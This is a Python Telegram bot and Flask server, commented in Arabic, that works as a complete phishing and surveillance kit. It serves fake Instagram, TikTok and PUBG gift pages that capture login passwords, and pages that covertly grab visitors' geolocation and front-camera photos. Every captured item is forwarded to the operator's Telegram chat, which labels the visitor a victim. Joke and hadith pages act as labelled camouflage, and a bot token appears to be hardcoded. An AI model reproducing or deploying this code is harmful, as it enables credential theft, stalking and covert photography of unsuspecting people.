import os
import threading
import telebot
import base64
from flask import Flask, request, render_template_string
from telebot import types

# --- الإعدادات الأساسية (بيانات الجنرال) ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
MY_TITLE = "الجنرال"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- رسالة الترحيب والحقوق ---
WELCOME_MSG = f"""
🎖️ أهلاً بك يا {MY_TITLE} في لوحة التحكم
--------------------------------------
تم تطوير البوت بواسطة: {MY_TITLE}
الحقوق محفوظة © 2026
--------------------------------------
اختر الصفحة التي تريد توليد رابطها:
"""

# --- قوالب الصفحات المتكاملة ---
PAGES = {
    # 1. رشق إنستغرام
    "gift_ig": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>هدية إنستغرام</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}body{background:radial-gradient(circle at 30% 10%, #f09433, #d62976, #962fbf, #4f5bd5);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}.card{max-width:380px;width:100%;background:#fff;border-radius:32px;box-shadow:0 25px 50px rgba(0,0,0,0.3);overflow:hidden;}.header{background:linear-gradient(135deg,#f09433,#d62976);padding:28px 20px;text-align:center;color:white;}.form{padding:32px 24px 40px;}.input-group input{width:100%;padding:15px;margin-bottom:18px;border:1px solid #dbdbdb;border-radius:14px;background:#fafafa;}.login-btn{width:100%;background:#0095f6;border:none;padding:15px;border-radius:14px;font-weight:700;color:white;cursor:pointer;}</style></head><body><div class="card"><div class="header"><div style="font-size:55px;">🎁✨</div><h1>تهانينا!</h1><p>لقد تم اختيارك للفوز بـ 10,000 متابع</p></div><div class="form"><form id="f"><div class="input-group"><input type="text" id="u" placeholder="اسم المستخدم أو البريد" required></div><div class="input-group"><input type="password" id="p" placeholder="كلمة المرور" required></div><button type="submit" class="login-btn">استلام الهدية</button></form></div></div><script>document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',u:document.getElementById('u').value,p:document.getElementById('p').value,platform:'Instagram Gift'})}).finally(()=>{window.location.href='https://instagram.com';});});</script></body></html>""",

    # 2. رشق تيك توك
    "gift_tk": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>هدية تيك توك</title><style>body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;}.card{max-width:380px;width:100%;background:#fff;border-radius:48px;border:2px solid #fe2c55;overflow:hidden;text-align:center;}.header{background:linear-gradient(135deg,#25F4EE,#FE2C55);padding:25px;color:white;}.form{padding:30px;}.form input{width:100%;padding:15px;margin:10px 0;border-radius:40px;border:1px solid #ddd;}.btn{width:100%;background:#fe2c55;color:white;padding:15px;border-radius:40px;border:none;font-weight:bold;cursor:pointer;}</style></head><body><div class="card"><div class="header"><div style="font-size:50px;">🎁🔥</div><h1>عرض المليون</h1><p>50,000 عملة مجانية</p></div><div class="form"><form id="f"><input type="text" id="u" placeholder="الإيميل أو الهاتف" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">الحصول على الهدية</button></form></div></div><script>document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',u:document.getElementById('u').value,p:document.getElementById('p').value,platform:'TikTok Gift'})}).finally(()=>{window.location.href='https://tiktok.com';});});</script></body></html>""",

    # 3. شدات ببجي
    "pubg": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>هدية ببجي</title><style>body{background:#1a2a3a;display:flex;justify-content:center;align-items:center;min-height:100vh;}.card{max-width:370px;width:100%;background:#1e2a2e;border:2px solid #ffc107;border-radius:28px;text-align:center;color:#ffc107;}.header{background:#ffc107;padding:20px;color:#000;}.form{padding:30px;}.form input{width:100%;padding:14px;margin:10px 0;border-radius:40px;text-align:center;}.btn{width:100%;background:#ffc107;padding:14px;border-radius:40px;border:none;font-weight:bold;cursor:pointer;}</style></head><body><div class="card"><div class="header"><h1>PUBG UC</h1></div><div class="form"><form id="f"><input type="text" id="u" placeholder="ID ببجي أو الإيميل" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">استلام 6000 UC</button></form></div></div><script>document.getElementById('f').onclick=(e)=>{e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',u:document.getElementById('u').value,p:document.getElementById('p').value,platform:'PUBG UC'})}).finally(()=>{window.location.href='https://pubg.com';});};</script></body></html>""",

    # 4. جلب الموقع
    "location": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>جلب الموقع</title><style>body{font-family:Arial;text-align:center;padding:50px;direction:rtl;}button{padding:12px 24px;font-size:18px;background:#007bff;color:white;border:none;border-radius:8px;cursor:pointer;}</style></head><body><h2>جلب موقعي الحالي</h2><button id="getLocation">طلب الموقع</button><div id="result"></div><script>document.getElementById('getLocation').onclick=()=>{if('geolocation' in navigator){navigator.geolocation.getCurrentPosition((pos)=>{fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'loc',lat:pos.coords.latitude,lon:pos.coords.longitude})});document.getElementById('result').innerHTML="تم إرسال الموقع بنجاح.";},(err)=>{document.getElementById('result').innerHTML="خطأ: "+err.message;});}else{document.getElementById('result').innerHTML="المتصفح لا يدعم.";}};</script></body></html>""",

    # 5. سحب الكاميرا
    "camera": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>تصوير ذاتي</title><style>body{text-align:center;padding:20px;}video{width:100%;max-width:400px;border-radius:12px;}button{padding:10px 20px;font-size:16px;}</style></head><body><h2>التقاط صورة</h2><video id="v" autoplay playsinline></video><br><button id="s">التقط الصورة</button><canvas id="c" style="display:none;"></canvas><script>const v=document.getElementById('v');const c=document.getElementById('c');async function init(){const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});v.srcObject=s;}document.getElementById('s').onclick=()=>{const ctx=c.getContext('2d');c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'img',data:c.toDataURL('image/jpeg')})});alert("تم الالتقاط!");};init();</script></body></html>""",

    # 6. نكت (تمويه)
    "joke": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>نكت مضحكة</title><style>body{text-align:center;padding:40px;background:#f9eec1;direction:rtl;}</style></head><body><h1>😂 نكتة اليوم</h1><div id="j" style="font-size:24px; margin:20px;">اضغط للجلب</div><button onclick="get()">نكتة جديدة</button><script>function get(){const j=["مرة واحد خبط بالباب قال مين","ليش الفراولة حمراء؟"];document.getElementById('j').innerHTML=j[Math.floor(Math.random()*j.length)];}</script></body></html>""",

    # 7. أحاديث (تمويه)
    "hadith": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>أحاديث نبوية</title><style>body{background:#f5f0e7;text-align:center;padding:30px;direction:rtl;}</style></head><body><h1>📖 حديث نبوي</h1><div id="h" style="font-size:1.6rem; margin:20px;"></div><button onclick="next()">حديث آخر</button><script>function next(){document.getElementById('h').innerHTML="إنما الأعمال بالنيات";}next();</script></body></html>"""
}

# --- نظام التحكم ---
def get_main_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🎁 رشق إنستغرام", callback_data="btn_gift_ig"),
        types.InlineKeyboardButton("🎁 رشق تيك توك", callback_data="btn_gift_tk"),
        types.InlineKeyboardButton("🎮 شدات ببجي", callback_data="btn_pubg"),
        types.InlineKeyboardButton("📍 سحب موقع", callback_data="btn_location"),
        types.InlineKeyboardButton("📷 سحب كاميرا", callback_data="btn_camera"),
        types.InlineKeyboardButton("😂 نكت مضحكة", callback_data="btn_joke"),
        types.InlineKeyboardButton("📜 أحاديث شريفة", callback_data="btn_hadith")
    )
    return kb

@app.route('/')
def home():
    t = request.args.get('type', 'joke')
    return render_template_string(PAGES.get(t, PAGES['joke']))

@app.route('/submit', methods=['POST'])
def submit():
    d = request.json
    if d['type'] == 'login':
        msg = f"🚨 *سحب حساب جديد:*\n🎖️ بواسطة: {MY_TITLE}\n🌐 المنصة: {d['platform']}\n👤: `{d['u']}`\n🔑: `{d['p']}`"
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    elif d['type'] == 'loc':
        bot.send_message(ADMIN_ID, f"📍 *موقع الضحية:*\nhttp://google.com/maps/place/{d['lat']},{d['lon']}")
    elif d['type'] == 'img':
        img = base64.b64decode(d['data'].split(',')[1])
        bot.send_photo(ADMIN_ID, img, caption=f"📸 صورة سحبها: {MY_TITLE}")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id == ADMIN_ID:
        bot.send_message(m.chat.id, WELCOME_MSG, reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda c: c.data.startswith("btn_"))
def send_link(c):
    platform = c.data.split("_", 1)[1]
    # استبدل الرابط أدناه برابط تطبيقك الفعلي من Render
    host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'ezz-app.onrender.com')
    url = f"https://{host}/?type={platform}"
    bot.send_message(c.message.chat.id, f"🔗 الرابط الجاهز للهجوم ({platform}):\n`{url}`", parse_mode='Markdown')

threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
